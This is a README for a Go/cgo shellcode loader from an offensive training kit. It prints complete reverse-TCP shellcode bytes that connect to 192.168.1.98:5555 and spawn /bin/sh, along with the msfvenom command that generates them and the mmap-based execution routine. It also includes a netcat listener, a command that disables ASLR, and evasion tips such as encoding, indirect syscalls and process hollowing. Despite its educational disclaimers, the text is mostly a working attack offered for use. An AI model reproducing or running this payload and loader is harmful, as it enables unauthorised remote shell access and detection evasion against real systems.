# 🛠️ Reverse Shell Shellcode Execution in Go – Educational Example

> **⚠️ Warning**: This code is **for educational purposes only** and should **only be used in authorized, controlled environments**. Unauthorized use is illegal and unethical.

---

## 📌 Overview

This project demonstrates how to **execute raw x86-64 assembly shellcode** from a **Go program** using `cgo` to interface with native C code. The shellcode establishes a **reverse TCP shell** back to a specified attacker-controlled IP and port.

This example is ideal for learning:
- How shellcode works at a low level.
- Memory allocation and execution techniques.
- Integration of Go with native C code via `cgo`.
- Core concepts in offensive security and post-exploitation.

---

## 🔧 Shellcode Functionality

The included shellcode performs the following actions:

1. ✅ Creates a TCP socket using `socket()`.
2. ✅ Connects back to `192.168.1.98:5555` using `connect()`.
3. ✅ Redirects `stdin`, `stdout`, and `stderr` to the socket using `dup2()` (x3).
4. ✅ Executes `/bin/sh` via `execve()`, giving the attacker an interactive shell.

👉 This is a classic **reverse shell payload**, commonly used in penetration testing and exploit development.

---

## 🧪 Shellcode Generation

The shellcode was generated using **Metasploit's `msfvenom`**:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.98 LPORT=5555 -f c -o shellcode_linux.txt
```

- Platform: Linux x86_64
- Payload: linux/x64/shell_reverse_tcp
- Target IP: 192.168.1.98
- Target Port: 5555



```c
unsigned char shellcode[] = 
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2"
"\xb0\x29\x0f\x05\x48\x89\xc7\x52\x66\x68\x15\xB3"
"\x68\xC0\xA8\x01\x62\x66\x68\x02\x00\x89\xe6\xb0"
"\x2a\x0f\x05\x48\x89\xc7\xb0\x21\x0f\x05\x48\x89"
"\xc7\xb0\x21\xb6\x01\x0f\x05\x48\x89\xc7\xb0\x21"
"\xb6\x02\x0f\x05\x48\x31\xc0\x48\xbb\x2f\x62\x69"
"\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x48\x31\xf6"
"\x48\x31\xd2\xb0\x3b\x0f\x05";
```

## 🧰 Requirements
- Go (version 1.18 or higher)
- C compiler (e.g., gcc)
- Linux x86_64 system
- Ability to allocate executable memory (mmap with PROT_EXEC)
- Disable ASLR (optional, for reliability in testing):

echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

## 🚀 How to Use (Controlled Environment)

1. Set up the listener (attacker machine)
On your machine (or at 192.168.1.98), start a netcat listener:

```bash
nc -lvnp 5555
```

2. Compile and run the Go program

```bash
go run shell.go
```
⚠️ If you get errors (e.g., permission denied), ensure your system allows executable memory allocation. Some security modules (SELinux, AppArmor) may block this. 

3. Get the reverse shell
If successful, you'll receive a shell on your netcat listener:

```bash

$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.1.98] from (UNKNOWN) [192.168.1.XX] 34567
whoami
victim-user
pwd
/tmp
```
## 💡 Code Breakdown
Using cgo to Call C from Go
The Go file uses import "C" to embed C code. The function ejecutarShellcode():

Allocates executable memory using mmap.
Copies the shellcode into that memory.
Casts the memory to a function pointer and executes it.
Memory Execution Flow

```c
⌄
void *exec_mem = mmap(0, shellcode_size, PROT_READ | PROT_WRITE | PROT_EXEC, 
                      MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
if (exec_mem == MAP_FAILED) {
    perror("mmap");
    return;
}

memcpy(exec_mem, shellcode, shellcode_size);

void (*ret)() = (void(*)())exec_mem;
ret();  // Execute shellcode
```
This mimics real-world code injection and shellcode stagers used in exploits.

## 🛡️ Detection & Evasion (Advanced Notes)
- Static Detection: The raw hex string is easily detectable by AV/EDR and YARA rules.
- Dynamic Behavior: Sequence of syscalls (socket, connect, execve) is highly suspicious.
- Evasion Ideas (for learning):
- Encrypt or encode the shellcode (e.g., XOR, Base64).
- Use indirect syscalls or mmap + mprotect for stealth.
- Reflective loading or process hollowing (Windows equivalent concepts).

## 📚 Learning Objectives

✅ Understand how shellcode works
✅ Learn memory execution techniques
✅ Practice safe exploitation in labs
✅ Explore Go’s capabilities in offensive tools

## ❌ Legal & Ethical Notice
This code must never be used:

- On systems you don’t own or have explicit permission to test.
- In production environments without authorization.
- For malicious purposes.
- Use only in labs, CTFs, or authorized penetration tests.

## 🙌 Feedback & Contributions
Have ideas to improve this example? Want to add encoded shellcode, stageless payloads, or detection bypasses? Contributions are welcome!

## 🔥 Happy hacking (the right way)!
— LazyOwn Red Team Training Kit 


---

✅ **Links**  

[+] CGOblin the big brother of gomulti_loader: https://github.com/grisuno/cgoblin
[+] Shorts: https://www.youtube.com/shorts/kPZvVV_RNIE
[+] Deepwiki: https://deepwiki.com/grisuno/gomulti_loader
[+] gomulti_loader the little brother of CGOblin: https://github.com/grisuno/gomulti_loader
[+] Deepwiki: https://deepwiki.com/grisuno/cgoblin
[+] Github: https://github.com/grisuno/LazyOwn
[+] Web: https://grisuno.github.io/LazyOwn/
[+] Reddit: https://www.reddit.com/r/LazyOwn/
[+] Facebook: https://web.facebook.com/profile.php?id=61560596232150
[+] HackTheBox: https://app.hackthebox.com/teams/overview/6429
[+] Grisun0: https://app.hackthebox.com/users/1998024
[+] Patreon: https://patreon.com/LazyOwn
[↙] Download: https://github.com/grisuno/LazyOwn/archive/refs/tags/release/0.2.48.tar.gz

![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) ![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)
